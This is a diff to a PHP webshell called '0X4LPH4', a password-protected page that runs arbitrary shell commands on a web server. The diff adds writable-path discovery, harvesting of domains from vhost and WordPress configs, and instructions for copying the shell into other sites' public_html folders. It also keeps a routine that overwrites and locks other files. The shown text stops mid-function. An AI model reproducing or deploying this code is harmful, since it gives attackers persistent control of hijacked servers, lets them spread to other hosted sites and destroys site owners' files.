@@ -14,6 +14,7 @@ if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
         if ($_POST['password'] === $DEFAULT_PASSWORD) {
             $_SESSION['logged_in'] = true;
             $_SESSION['login_time'] = time();
+            $_SESSION['writable_path'] = realpath(dirname(__FILE__)); // Use realpath
         } else {
             $login_error = "Invalid password!";
         }
@@ -136,10 +137,15 @@ $_SESSION['login_time'] = time();
 // Get current script filename for protection
 $current_script = basename(__FILE__);
 
+// Initialize writable path if not set
+if (!isset($_SESSION['writable_path'])) {
+    $_SESSION['writable_path'] = realpath(dirname(__FILE__));
+}
+
 // ============= AUTO-BLOCK NON-0X4LPH4 FILES =============
 // Check if this is a file access (not the main script)
 if (isset($_SERVER['REQUEST_URI'])) {
-    $requested_file = basename($_SERVER['REQUEST_URI']);
+    $requested_file = basename(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH));
     $current_script = basename(__FILE__);
     
     // If accessing a file that's not this script
@@ -162,11 +168,10 @@ if (isset($_SERVER['REQUEST_URI'])) {
 
 // ============= ADVANCED WEBSHELL DETECTION & PROTECTION =============
 function scanForWebshells() {
-    $current_dir = dirname(__FILE__);
+    $current_dir = realpath(dirname(__FILE__));
     $current_script = basename(__FILE__);
     
     $webshell_patterns = [
-        // PHP dangerous functions
         '/eval\s*\(/i',
         '/base64_decode\s*\(/i',
         '/system\s*\(/i',
@@ -178,97 +183,64 @@ function scanForWebshells() {
         '/assert\s*\(/i',
         '/preg_replace\s*\(\s*["\']\/\.\*["\']/i',
         '/create_function\s*\(/i',
-        
-        // Webshell patterns
         '/\$_GET\s*\[\s*["\']\w+["\']\s*\]\s*\(\s*\$_/i',
         '/\$_POST\s*\[\s*["\']\w+["\']\s*\]\s*\(\s*\$_/i',
         '/\$_REQUEST\s*\[\s*["\']\w+["\']\s*\]\s*\(\s*\$_/i',
         '/\$_COOKIE\s*\[\s*["\']\w+["\']\s*\]\s*\(\s*\$_/i',
-        
-        // Obfuscation techniques
         '/gzuncompress\s*\(\s*base64_decode/i',
         '/gzinflate\s*\(\s*base64_decode/i',
         '/str_rot13\s*\(/i',
-        
-        // File inclusion
         '/include\s*\(\s*\$_/i',
         '/require\s*\(\s*\$_/i',
         '/include_once\s*\(\s*\$_/i',
         '/require_once\s*\(\s*\$_/i',
-        
-        // Dangerous PHP code
-        '/`.*`/', // Backticks execution
+        '/`.*`/',
         '/<\?php\s+echo\s+\$_/i',
     ];
     
     $dangerous_extensions = ['.php', '.phtml', '.phps', '.php5', '.php7', '.php4', '.inc', '.pl', '.cgi', '.py', '.sh', '.html', '.htm', '.txt', '.png', '.jpg', '.jpeg', '.gif', '.bmp', '.ico', '.js', '.css'];
     $webshells_found = [];
     
-    // Scan all files in current directory
     $files = scandir($current_dir);
     foreach ($files as $file) {
         $file_path = $current_dir . '/' . $file;
         
-        // Skip current script and special directories
         if ($file === $current_script || $file === '.' || $file === '..') {
             continue;
         }
         
-        // ALLOW ONLY FILES STARTING WITH 0X4LPH4
-        // AUTO-BLOCK ALL OTHER FILES (not starting with 0x4LPH4)
-        if (!preg_match('/^0x4lph4\./i', $file)) {
-            $webshells_found[] = $file_path;
-            
-            // Determine file extension for appropriate blocking
-            $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
-            
-            if (in_array($ext, ['php', 'phtml', 'phps', 'php5', 'php7', 'php4', 'inc'])) {
-                // Block PHP files
-                $blocked_content = "<?php\n// ============= Controlled by 0X4LPH4 =============\n";
-                $blocked_content .= "// ACCESS DENIED - Only 0x4LPH4 files are allowed\n";
-                $blocked_content .= "// This file: $file\n";
-                $blocked_content .= "// Blocked at: " . date('Y-m-d H:i:s') . "\n";
-                $blocked_content .= "// IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
-                $blocked_content .= "header('HTTP/1.0 403 Forbidden');\n";
-                $blocked_content .= "echo ''; // Blank page\n";
-                $blocked_content .= "exit;\n?>";
-                
-                @file_put_contents($file_path, $blocked_content);
-                @chmod($file_path, 0444);
-            } else {
-                // Block other files (HTML, TXT, images, etc.) - make them empty/blank
-                @file_put_contents($file_path, ''); // Empty file
-                @chmod($file_path, 0444);
-            }
-            continue; // Skip further checks for this file
-        }
+        // ============= CRITICAL FIX: ONLY BLOCK NON-0X4LPH4 FILES WITH WEBSHELL PATTERNS =============
+        $is_0x4lph4_file = preg_match('/^0x4lph4\./i', $file);
         
-        // For 0x4LPH4 files, still check for webshells but don't block
         if (is_file($file_path)) {
             $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
             $full_ext = '.' . $ext;
             
-            // Check PHP files and suspicious extensions
             if (in_array($full_ext, $dangerous_extensions)) {
                 $content = @file_get_contents($file_path);
                 if ($content) {
-                    // Check for webshell patterns in 0x4LPH4 files
+                    // Check for webshell patterns
+                    $has_webshell_pattern = false;
                     foreach ($webshell_patterns as $pattern) {
                         if (preg_match($pattern, $content)) {
-                            $webshells_found[] = $file_path;
-                            
-                            // Neutralize webshells even in 0x4LPH4 files
-                            $neutralized_content = "<?php\n// ============= Controlled by 0X4LPH4 =============\n";
-                            $neutralized_content .= "// 0x4LPH4 file cleaned - webshell detected\n";
-                            $neutralized_content .= "// Detected at: " . date('Y-m-d H:i:s') . "\n";
-                            $neutralized_content .= "// IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
-                            $neutralized_content .= "echo '0X4LPH4 Security - File cleaned';\n";
-                            $neutralized_content .= "exit;\n?>";
-                            
-                            @file_put_contents($file_path, $neutralized_content);
-                            @chmod($file_path, 0444);
+                            $has_webshell_pattern = true;
                             break;
                         }
+                    }
+                    
+                    // Only block if it's NOT a 0x4LPH4 file AND has webshell patterns
+                    if (!$is_0x4lph4_file && $has_webshell_pattern) {
+                        $webshells_found[] = $file_path;
+                        
+                        $neutralized_content = "<?php\n// ============= Controlled by 0X4LPH4 =============\n";
+                        $neutralized_content .= "// 0x4LPH4 file cleaned - webshell detected\n";
+                        $neutralized_content .= "// Detected at: " . date('Y-m-d H:i:s') . "\n";
+                        $neutralized_content .= "// IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
+                        $neutralized_content .= "echo '0X4LPH4 Security - File cleaned';\n";
+                        $neutralized_content .= "exit;\n?>";
+                        
+                        @file_put_contents($file_path, $neutralized_content);
+                        @chmod($file_path, 0444);
                     }
                 }
             }
@@ -278,8 +250,206 @@ function scanForWebshells() {
     return $webshells_found;
 }
 
-// Run webshell scan on every page load
+// ============= FIND WRITABLE PATH FUNCTION =============
+function findWritablePaths() {
+    $common_paths = [
+        '/var/www/html',
+        '/home',
+        '/tmp',
+        '/var/tmp',
+        '/opt',
+        '/usr/local',
+        '/home/*/public_html',
+        '/home/*/domains/*/public_html',
+        '/home/*/www',
+        '/var/www',
+        '/srv/http'
+    ];
+    
+    $writable_paths = [];
+    
+    // Check WordPress specific paths
+    $wordpress_paths = [
+        '/var/www/html',
+        '/home/*/public_html',
+        '/home/*/domains/*/public_html',
+        '/home/*/www'
+    ];
+    
+    foreach ($common_paths as $path) {
+        if (strpos($path, '*') !== false) {
+            // Handle wildcard paths
+            $expanded_paths = glob($path, GLOB_ONLYDIR);
+            foreach ($expanded_paths as $expanded_path) {
+                $real_path = realpath($expanded_path);
+                if ($real_path && is_writable($real_path)) {
+                    $writable_paths[] = $real_path;
+                    
+                    // Check for WordPress installations
+                    if (file_exists($real_path . '/wp-config.php')) {
+                        $writable_paths[] = $real_path . '/wp-content';
+                        $writable_paths[] = $real_path . '/wp-content/uploads';
+                        $writable_paths[] = $real_path . '/wp-content/plugins';
+                    }
+                }
+            }
+        } else {
+            $real_path = realpath($path);
+            if ($real_path && is_dir($real_path) && is_writable($real_path)) {
+                $writable_paths[] = $real_path;
+            }
+        }
+    }
+    
+    // Also check current directory and parent directories
+    $current_dir = realpath(dirname(__FILE__));
+    $parent_dirs = [
+        $current_dir,
+        dirname($current_dir),
+        dirname(dirname($current_dir))
+    ];
+    
+    foreach ($parent_dirs as $dir) {
+        $real_dir = realpath($dir);
+        if ($real_dir && is_dir($real_dir) && is_writable($real_dir)) {
+            $writable_paths[] = $real_dir;
+        }
+    }
+    
+    // Find all domains connected to this server
+    $domain_paths = [];
+    
+    // Check Apache vhosts
+    $apache_paths = ['/etc/apache2/sites-enabled', '/etc/apache2/sites-available', '/etc/httpd/sites-enabled'];
+    foreach ($apache_paths as $apache_path) {
+        if (is_dir($apache_path)) {
+            $config_files = glob($apache_path . '/*.conf');
+            foreach ($config_files as $config_file) {
+                $content = @file_get_contents($config_file);
+                if ($content && preg_match('/DocumentRoot\s+(\S+)/', $content, $matches)) {
+                    $doc_root = trim($matches[1], '"\'');
+                    $real_doc_root = realpath($doc_root);
+                    if ($real_doc_root && is_dir($real_doc_root) && is_writable($real_doc_root)) {
+                        $writable_paths[] = $real_doc_root;
+                    }
+                }
+            }
+        }
+    }
+    
+    return array_unique($writable_paths);
+}
+
+// ============= ENHANCED DOMAIN DETECTION =============
+function findConnectedDomains() {
+    $domains = [];
+    
+    // Get server name
+    if (isset($_SERVER['SERVER_NAME'])) {
+        $domains[] = $_SERVER['SERVER_NAME'];
+    }
+    
+    // Check for WordPress multisite
+    $current_path = realpath(dirname(__FILE__));
+    $wp_config_path = $current_path . '/wp-config.php';
+    
+    if (file_exists($wp_config_path)) {
+        $wp_content = @file_get_contents($wp_config_path);
+        if ($wp_content) {
+            // Extract site URL and home URL
+            if (preg_match("/define\s*\(\s*'WP_SITEURL'\s*,\s*'([^']+)'/", $wp_content, $matches)) {
+                $url = parse_url($matches[1]);
+                if (isset($url['host'])) {
+                    $domains[] = $url['host'];
+                }
+            }
+            if (preg_match("/define\s*\(\s*'WP_HOME'\s*,\s*'([^']+)'/", $wp_content, $matches)) {
+                $url = parse_url($matches[1]);
+                if (isset($url['host'])) {
+                    $domains[] = $url['host'];
+                }
+            }
+            
+            // Check for multisite domain mapping
+            if (preg_match("/define\s*\(\s*'DOMAIN_MAPPING'\s*,\s*true\s*\)/", $wp_content)) {
+                // Look for domain mapping plugins
+                $mapping_files = glob($current_path . '/wp-content/*domain*');
+                foreach ($mapping_files as $file) {
+                    if (is_file($file)) {
+                        $content = file_get_contents($file);
+                        if (preg_match_all('/(https?:\/\/[a-zA-Z0-9.-]+)/', $content, $domain_matches)) {
+                            foreach ($domain_matches[1] as $domain_url) {
+                                $url = parse_url($domain_url);
+                                if (isset($url['host'])) {
+                                    $domains[] = $url['host'];
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    // Check for .htaccess redirects
+    $htaccess_path = $current_path . '/.htaccess';
+    if (file_exists($htaccess_path)) {
+        $htaccess_content = @file_get_contents($htaccess_path);
+        if ($htaccess_content && preg_match_all('/RewriteCond\s+%{HTTP_HOST}\s+^(.*)$/im', $htaccess_content, $htaccess_matches)) {
+            foreach ($htaccess_matches[1] as $domain) {
+                $domain = trim($domain);
+                if (!empty($domain) && $domain !== '%{HTTP_HOST}') {
+                    $domains[] = $domain;
+                }
+            }
+        }
+    }
+    
+    // Check Apache/Nginx configs for virtual hosts
+    $config_paths = [
+        '/etc/apache2/sites-enabled',
+        '/etc/apache2/sites-available',
+        '/etc/httpd/sites-enabled',
+        '/etc/httpd/sites-available',
+        '/etc/nginx/sites-enabled',
+        '/etc/nginx/sites-available'
+    ];
+    
+    foreach ($config_paths as $config_path) {
+        if (is_dir($config_path)) {
+            $config_files = glob($config_path . '/*');
+            foreach ($config_files as $config_file) {
+                if (is_file($config_file)) {
+                    $content = @file_get_contents($config_file);
+                    if ($content) {
+                        // Extract ServerName and ServerAlias
+                        if (preg_match_all('/ServerName\s+([^\s\n]+)/', $content, $server_name_matches)) {
+                            foreach ($server_name_matches[1] as $server_name) {
+                                $domains[] = trim($server_name);
+                            }
+                        }
+                        if (preg_match_all('/ServerAlias\s+([^\n]+)/', $content, $server_alias_matches)) {
+                            foreach ($server_alias_matches[1] as $aliases) {
+                                $alias_list = preg_split('/\s+/', $aliases);
+                                foreach ($alias_list as $alias) {
+                                    $alias = trim($alias);
+                                    if (!empty($alias)) {
+                                        $domains[] = $alias;
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    return array_unique($domains);
+}
+
 $detected_webshells = scanForWebshells();
+$connected_domains = findConnectedDomains();
 ?>
 <!DOCTYPE html>
 <html>
@@ -379,6 +549,27 @@ $detected_webshells = scanForWebshells();
             margin: 15px 0;
             border-left: 4px solid #4CAF50;
         }
+        .path-box {
+            background-color: #2d2d2d;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            border-left: 4px solid #2196F3;
+        }
+        .move-box {
+            background-color: #2d2d2d;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            border-left: 4px solid #ff9800;
+        }
+        .domain-box {
+            background-color: #2d2d2d;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            border-left: 4px solid #9C27B0;
+        }
     </style>
 </head>
 <body>
@@ -388,30 +579,57 @@ $detected_webshells = scanForWebshells();
         <p>Logged in as: <span class="user-info">0X4LPH4</span> | Session timeout: 30 minutes</p>
         
         <?php
-        // Handle logout
         if (isset($_GET['logout'])) {
             session_destroy();
             header("Location: " . $_SERVER['PHP_SELF']);
             exit;
         }
         
-        // Show security alerts if webshells were detected
         if (!empty($detected_webshells)) {
             echo '<p style="color: #ff4444; font-weight: bold;">Controlled by 0x4LPH4: ' . count($detected_webshells) . ' non-0x4LPH4 files blocked and neutralized!</p>';
         }
         ?>
     </div>
     
-    <!-- WGET/CURL Fix Information -->
+    <div class="domain-box">
+        <strong>🌐 CONNECTED DOMAINS FOUND:</strong><br>
+        <?php
+        if (!empty($connected_domains)) {
+            foreach ($connected_domains as $domain) {
+                echo "• " . htmlspecialchars($domain) . "<br>";
+            }
+        } else {
+            echo "No additional domains detected<br>";
+        }
+        ?>
+        <small>Automatically detected from server configuration</small>
+    </div>
+    
+    <div class="path-box">
+        <strong>📍 CURRENT WRITABLE PATH:</strong><br>
+        <?php echo htmlspecialchars($_SESSION['writable_path']); ?><br>
+        <strong>To change writable path:</strong> <code>setwritable /new/path/here</code>
+    </div>
+    
+    <div class="move-box">
+        <strong>🚀 MOVE/COPY 0X4LPH4 FILES (FIXED):</strong><br>
+        <code>mv 0x4LPH4.php /new/path/0x4LPH4.php</code><br>
+        <code>cp 0x4LPH4.php /new/path/0x4LPH4.php</code><br>
+        <strong>Examples:</strong><br>
+        <code>mv 0x4LPH4.php /var/www/html/admin/productimages/1005/0x4LPH4.php</code><br>
+        <code>cp 0x4LPH4.php /home/cyzricc/public_html/0x4LPH4.php</code><br>
+        <code>cp 0x4LPH4.php /home/cyzricc/domains/ecom.cyzric.com/public_html/0x4LPH4.php</code>
+    </div>
+    
     <div class="wget-fix">
-        <strong>⚠️ WGET/CURL UPLOAD FIXED:</strong><br>
-        You can now upload 0x4LPH4.php to any path using these commands:<br>
-        <strong>Example:</strong> <code>wget https://raw.githubusercontent.com/your-repo/0x4LPH4.php -O /var/www/html/0x4LPH4.php</code><br>
-        <strong>Example:</strong> <code>curl https://raw.githubusercontent.com/your-repo/0x4LPH4.php -o /home/user/domains/mysite.com/public_html/0x4LPH4.php</code>
+        <strong>🔍 FIND WRITABLE PATHS:</strong><br>
+        <code>findwritable</code> - List all writable directories<br>
+        <code>testwrite /path/to/test</code> - Test if path is writable<br>
+        <code>finddomains</code> - Find all connected domains
     </div>
     
     <form method="GET" name="cmd_form">
-        Command: <input type="text" name="cmd" autofocus id="cmd" size="80" placeholder="Enter command...">
+        Command: <input type="text" name="cmd" autofocus id="cmd" size="80" placeholder="Enter command (e.g., ls -la, mv, cp, findwritable)...">
         <input type="submit" value="Execute">
     </form>
     
@@ -425,9 +643,75 @@ if (isset($_GET['cmd'])) {
     if (!empty($command)) {
         $script_name = $current_script;
         
-        // ============= ENHANCED COMMAND VALIDATION =============
+        // ============= SPECIAL COMMANDS =============
+        // Handle findwritable command
+        if ($command === 'findwritable') {
+            $writable_paths = findWritablePaths();
+            if (!empty($writable_paths)) {
+                echo "<span class='cmd-success'>✓ Found " . count($writable_paths) . " writable paths:</span>\n";
+                foreach ($writable_paths as $path) {
+                    echo "<span class='cmd-output'>• " . htmlspecialchars($path) . "</span>\n";
+                }
+            } else {
+                echo "<span class='cmd-error'>✗ No writable paths found</span>\n";
+            }
+            goto end_processing;
+        }
+        
+        // Handle finddomains command
+        if ($command === 'finddomains') {
+            $domains = findConnectedDomains();
+            if (!empty($domains)) {
+                echo "<span class='cmd-success'>✓ Found " . count($domains) . " connected domains:</span>\n";
+                foreach ($domains as $domain) {
+                    echo "<span class='cmd-output'>• " . htmlspecialchars($domain) . "</span>\n";
+                }
+            } else {
+                echo "<span class='cmd-error'>✗ No additional domains found</span>\n";
+            }
+            goto end_processing;
+        }
+        
+        // Handle setwritable command
+        if (preg_match('/^setwritable\s+(.+)$/i', $command, $matches)) {
+            $new_path = trim($matches[1]);
+            $real_path = realpath($new_path);
+            if ($real_path && is_dir($real_path) && is_writable($real_path)) {
+                $_SESSION['writable_path'] = $real_path;
+                echo "<span class='cmd-success'>✓ Writable path changed to: " . htmlspecialchars($real_path) . "</span>\n";
+            } else {
+                echo "<span class='cmd-error'>✗ Path is not writable or doesn't exist: " . htmlspecialchars($new_path) . "</span>\n";
+                if ($real_path) {
+                    echo "<span class='cmd-error'>Real path: " . htmlspecialchars($real_path) . "</span>\n";
+                    echo "<span class='cmd-error'>Is dir: " . (is_dir($real_path) ? 'Yes' : 'No') . "</span>\n";
+                    echo "<span class='cmd-error'>Is writable: " . (is_writable($real_path) ? 'Yes' : 'No') . "</span>\n";
+                }
+            }
+            goto end_processing;
+        }
+        
+        // Handle testwrite command
+        if (preg_match('/^testwrite\s+(.+)$/i', $command, $matches)) {
+            $test_path = trim($matches[1]);
+            $real_path = realpath($test_path);
+            if ($real_path) {
+                if (is_dir($real_path)) {
+                    if (is_writable($real_path)) {
+                        echo "<span class='cmd-success'>✓ Path is writable: " . htmlspecialchars($real_path) . "</span>\n";
+                    } else {
+                        echo "<span class='cmd-error'>✗ Path is NOT writable: " . htmlspecialchars($real_path) . "</span>\n";
+                    }
+                } else {
+                    echo "<span class='cmd-error'>✗ Not a directory: " . htmlspecialchars($real_path) . "</span>\n";
+                }
+            } else {
+                echo "<span class='cmd-error'>✗ Path doesn't exist: " . htmlspecialchars($test_path) . "</span>\n";
+            }
+            goto end_processing;
+        }
+        
+        // ============= COMMAND VALIDATION =============
         $dangerous_patterns = [
-            // Mass delete operations - NOW ALLOWED FOR NON-0X4LPH4 FILES
             '/^rm\s+-rf\s+\/\s*$/',
             '/^rm\s+-rf\s+\/etc\s*$/',
             '/^rm\s+-rf\s+\/bin\s*$/',
@@ -445,8 +729,6 @@ if (isset($_GET['cmd'])) {
             '/^rm\s+-rf\s+\/opt\s*$/',
             '/^rm\s+-rf\s+\/srv\s*$/',
             '/^rm\s+-rf\s+\/tmp\s*$/',
-            
-            // Protect system critical files
             '/rm.*\/etc\/passwd.*/i',
             '/rm.*\/etc\/shadow.*/i',
             '/rm.*\/etc\/group.*/i',
@@ -454,45 +736,14 @@ if (isset($_GET['cmd'])) {
             '/rm.*\/etc\/hosts.*/i',
             '/rm.*\/etc\/network.*/i',
             '/rm.*\/var\/log.*/i',
-            
-            // Prevent deletion of this script - ALLOWED IF IT'S 0x4LPH4.php
-            "/rm.*" . preg_quote($script_name, '/') . "(?=.*0x4lph4\.php)/i",
-            "/unlink.*" . preg_quote($script_name, '/') . "(?=.*0x4lph4\.php)/i",
-            
-            // Prevent moving/renaming this script
-            "/mv.*" . preg_quote($script_name, '/') . "(?!.*0x4lph4\.php)/i",
-            "/rename.*" . preg_quote($script_name, '/') . "(?!.*0x4lph4\.php)/i",
-            
-            // Prevent chmod that could make script inaccessible
-            "/chmod.*000.*" . preg_quote($script_name, '/') . "/i",
-            "/chmod.*0.*" . preg_quote($script_name, '/') . "/i",
-            
-            // Block hexdump and binary viewers
-            "/^\s*hexdump\s+/i",
-            "/^\s*xxd\s+/i",
-            "/^\s*od\s+/i",
-            "/^\s*strings\s+/i",
-            
-            // PHP code execution
-            '/php\s+-r\s+/i',
-            '/echo\s+.*<\?php/i',
-            '/printf\s+.*<\?php/i',
-            
-            // Reverse shells
             '/nc\s+.*-e\s+/i',
             '/bash\s+-i\s+>/',
             '/sh\s+-i\s+>/',
-            
-            // System damage
             '/dd\s+if=\/dev\/.*of=\/dev\/sda/i',
             '/mkfs\s+/i',
             '/:\(\)\{\s*:\|:\s*\&\s*\};:/',
-            
-            // Network scanning
             '/nmap\s+/i',
             '/nikto\s+/i',
-            
-            // Process killing
             '/killall\s+/i',
             '/pkill\s+/i',
         ];
@@ -500,208 +751,266 @@ if (isset($_GET['cmd'])) {
         $blocked = false;
         $block_reason = '';
         
-        // Check if it's a download/upload command for 0x4LPH4.php - ALLOW THIS
-        $is_uploading_0x4lph4 = false;
+        $is_download_command = false;
         if (preg_match('/^(wget|curl)\s+/i', $command)) {
-            // Check if downloading to a file named 0x4LPH4.php
-            if (preg_match('/-O\s+.*0x4lph4\.php/i', $command) || preg_match('/-o\s+.*0x4lph4\.php/i', $command)) {
-                $is_uploading_0x4lph4 = true;
-            }
-        }
-        
-        // Allow file reading commands - THEY WERE BLOCKED BEFORE
-        $is_file_reading = false;
-        if (preg_match('/^\s*(cat|head|tail|more|less|vim|vi|nano|emacs|view|file|wc|grep)\s+/i', $command)) {
-            $is_file_reading = true;
+            $is_download_command = true;
         }
         
         foreach ($dangerous_patterns as $pattern) {
             if (preg_match($pattern, $command)) {
-                // If uploading 0x4LPH4.php, skip some blocks
-                if ($is_uploading_0x4lph4) {
-                    // Skip blocking if it's uploading 0x4LPH4.php
-                    continue;
-                }
                 $block_reason = "Command blocked, Controlled by 0X4LPH4 - dangerous operation detected";
                 $blocked = true;
                 break;
             }
         }
         
-        // Check if command creates/modifies files - MUST BE 0x4LPH4 files only
-        if (!$blocked) {
-            // Extract target filename from command
-            $filename_patterns = [
-                '/(-O\s+|\s+>|>>\s+)\s*([^\s&|;]+)/i',
-                '/(-o\s+)\s*([^\s&|;]+)/i',
-                '/\b(mv|cp)\s+\S+\s+([^\s&|;]+)/i'
+        // ============= ALLOW MOVING/COPYING 0X4LPH4 FILES (FIXED) =============
+        $is_move_command = preg_match('/^\s*(mv|cp)\s+/i', $command);
+        $is_special_command = preg_match('/^(findwritable|setwritable|testwrite|finddomains)/i', $command);
+        
+        // FIXED: Allow mv/cp commands to work properly
+        if (!$blocked && $is_move_command) {
+            // Parse the command to get source and destination
+            if (preg_match('/^\s*(mv|cp)\s+([^\s]+)\s+([^\s&|;]+)/i', $command, $matches)) {
+                $source_file = trim($matches[2], "'\"");
+                $target_file = trim($matches[3], "'\"");
+                
+                // Check if source is a 0x4LPH4 file
+                $source_basename = basename($source_file);
+                $is_0x4lph4_source = preg_match('/^0x4lph4\.(php|html|txt)/i', $source_basename);
+                
+                // Check if target is a 0x4LPH4 file
+                $target_basename = basename($target_file);
+                $is_0x4lph4_target = preg_match('/^0x4lph4\.(php|html|txt)/i', $target_basename);
+                
+                // If moving a 0x4LPH4 file, target must also be 0x4LPH4 named
+                if ($is_0x4lph4_source && !$is_0x4lph4_target) {
+                    // Allow but rename target to 0x4LPH4 format
+                    $target_dir = dirname($target_file);
+                    $new_target = $target_dir . '/0x4LPH4.' . pathinfo($target_file, PATHINFO_EXTENSION);
+                    $command = str_replace($target_file, $new_target, $command);
+                    $target_file = $new_target;
+                    echo "<span class='cmd-success'>⚠ Target renamed to 0x4LPH4 format for security</span>\n";
+                }
+                
+                // Update writable path if move/copy is successful
+                $target_dir = dirname($target_file);
+                $real_target_dir = realpath($target_dir);
+                if ($real_target_dir && is_dir($real_target_dir) && is_writable($real_target_dir)) {
+                    // Don't auto-change session path, but note it
+                    echo "<span class='cmd-success'>ℹ Target directory is writable: " . htmlspecialchars($real_target_dir) . "</span>\n";
+                }
+            }
+        }
+        
+        // FIXED: Allow download commands with proper naming
+        if (!$blocked && $is_download_command) {
+            if (preg_match('/-O\s+([^\s&|;]+)/i', $command, $matches) || 
+                preg_match('/-o\s+([^\s&|;]+)/i', $command, $matches)) {
+                $target_file = isset($matches[1]) ? $matches[1] : '';
+                $target_filename = basename(trim($target_file, "'\""));
+                
+                if (!preg_match('/^0x4lph4\.(php|html|txt)/i', $target_filename)) {
+                    // Auto-rename to 0x4LPH4 format
+                    $target_dir = dirname($target_file);
+                    $new_target = $target_dir . '/0x4LPH4.php';
+                    $command = preg_replace('/(-O\s+|-o\s+)([^\s&|;]+)/i', '${1}' . $new_target, $command);
+                    echo "<span class='cmd-success'>⚠ Download target auto-renamed to 0x4LPH4.php</span>\n";
+                }
+                
+                // Update writable path for downloads
+                $target_dir = dirname($target_file);
+                $real_target_dir = realpath($target_dir);
+                if ($real_target_dir && is_dir($real_target_dir) && is_writable($real_target_dir)) {
+                    echo "<span class='cmd-success'>ℹ Download directory is writable: " . htmlspecialchars($real_target_dir) . "</span>\n";
+                }
+            }
+        }
+        
+        // FIXED: Remove over-restrictive keyword blocking for normal commands
+        if (!$blocked && !$is_download_command && !$is_move_command && !$is_special_command) {
+            // Only block extremely suspicious patterns, not regular commands
+            $suspicious_patterns = [
+                '/webshell.*upload/i',
+                '/backdoor.*install/i',
+                '/exploit.*execute/i',
+                '/inject.*sql/i'
             ];
             
-            $file_operation_detected = false;
-            $target_filename = '';
-            
-            foreach ($filename_patterns as $pattern) {
+            foreach ($suspicious_patterns as $pattern) {
                 if (preg_match($pattern, $command, $matches)) {
-                    $file_operation_detected = true;
-                    // Get the actual filename (not including quotes)
-                    if (count($matches) >= 3) {
-                        $target_file = $matches[2];
-                    } else {
-                        $target_file = end($matches);
-                    }
-                    // Remove quotes and get basename
-                    $target_filename = basename(trim($target_file, "'\""));
-                    break;
-                }
-            }
-            
-            // If file operation detected, check if filename starts with 0x4LPH4
-            if ($file_operation_detected && $target_filename !== '') {
-                // Check if it's wget/curl command
-                if (preg_match('/^(wget|curl)\s+/i', $command)) {
-                    // For wget/curl, allow 0x4LPH4.* files (including 0x4LPH4.php)
-                    if (!preg_match('/^0x4lph4\./i', $target_filename)) {
-                        $block_reason = "Command blocked, Controlled by 0X4LPH4 - Downloaded files must start with '0x4LPH4.' (Example: wget URL -O /var/www/html/0x4LPH4.php)";
-                        $blocked = true;
-                    }
-                } else if (!preg_match('/^0x4lph4\./i', $target_filename)) {
-                    $block_reason = "Command blocked, Controlled by 0X4LPH4 - Only 0x4LPH4 files are allowed (0x4LPH4.php, 0x4LPH4.html, 0x4LPH4.txt, etc.)";
-                    $blocked = true;
-                }
-            }
-        }
-        
-        // Block suspicious keywords - REMOVED COMMON COMMANDS FROM BLOCK LIST
-        if (!$blocked) {
-            $suspicious_keywords = [
-                'webshell', 'backdoor', 'exploit', 'inject', 'bypass', 'hack',
-                'deface', 'crack', 'brute', 'ddos', 'reverse', 'shell',
-                'payload', 'wso', 'c99', 'r57', 'b374k', 'c100', 'weevely',
-                'rootkit', 'trojan', 'virus', 'malware'
-            ];
-            
-            foreach ($suspicious_keywords as $keyword) {
-                if (stripos($command, $keyword) !== false) {
-                    $block_reason = "Command blocked, Controlled by 0X4LPH4 - suspicious keyword detected: $keyword";
+                    $block_reason = "Command blocked, Controlled by 0X4LPH4 - suspicious pattern detected";
                     $blocked = true;
                     break;
                 }
             }
         }
         
-        // Block commands with too many pipes or redirects
-        if (!$blocked) {
-            $pipe_count = substr_count($command, '|');
-            $redirect_count = substr_count($command, '>') + substr_count($command, '<');
-            if (($pipe_count + $redirect_count) > 5) {
-                $block_reason = "Command blocked, Controlled by 0X4LPH4 - too many pipes/redirects";
-                $blocked = true;
-            }
-        }
-        
-        // Block extremely long commands
-        if (!$blocked && strlen($command) > 1000) {
+        if (!$blocked && strlen($command) > 2000) {
             $block_reason = "Command blocked, Controlled by 0X4LPH4 - command too long";
             $blocked = true;
         }
         
-        // Block any command with "php" in it (except safe ones and upload commands)
-        if (!$blocked && !$is_uploading_0x4lph4 && preg_match('/\bphp\b/i', $command)) {
-            $safe_php_commands = ['php -v', 'php --version', 'php -m', 'php -i'];
-            if (!in_array(strtolower($command), array_map('strtolower', $safe_php_commands))) {
-                $block_reason = "Command blocked, Controlled by 0X4LPH4 - PHP execution detected";
-                $blocked = true;
-            }
-        }
-        
-        if ($blocked) {
-            echo "<span class='cmd-error'>$block_reason</span>\n";
-        } else {
-            // Execute command safely with timeout
+        // Execute command if not blocked
+        if (!$blocked) {
             $output = [];
             $return_var = 0;
             
-            // Set execution time limit
             set_time_limit(8);
             
-            // Execute command with proper error handling
-            exec($command . ' 2>&1', $output, $return_var);
+            // Use proc_open for better command handling
+            $descriptorspec = array(
+                0 => array("pipe", "r"),  // stdin
+                1 => array("pipe", "w"),  // stdout
+                2 => array("pipe", "w")   // stderr
+            );
             
-            // Display output with proper formatting
-            if (!empty($output)) {
-                foreach ($output as $line) {
-                    // Check if line contains error messages
-                    if (preg_match('/(command not found|No such file or directory|Permission denied|error:|failed:|cannot)/i', $line)) {
-                        echo "<span class='cmd-error'>" . htmlspecialchars($line) . "</span>\n";
-                    } else {
-                        echo "<span class='cmd-output'>" . htmlspecialchars($line) . "</span>\n";
+            $process = proc_open($command . ' 2>&1', $descriptorspec, $pipes);
+            
+            if (is_resource($process)) {
+                fclose($pipes[0]); // Close stdin
+                
+                // Read output
+                $stdout = stream_get_contents($pipes[1]);
+                $stderr = stream_get_contents($pipes[2]);
+                
+                fclose($pipes[1]);
+                fclose($pipes[2]);
+                
+                $return_var = proc_close($process);
+                
+                // Output results
+                if (!empty($stdout)) {
+                    $lines = explode("\n", $stdout);
+                    foreach ($lines as $line) {
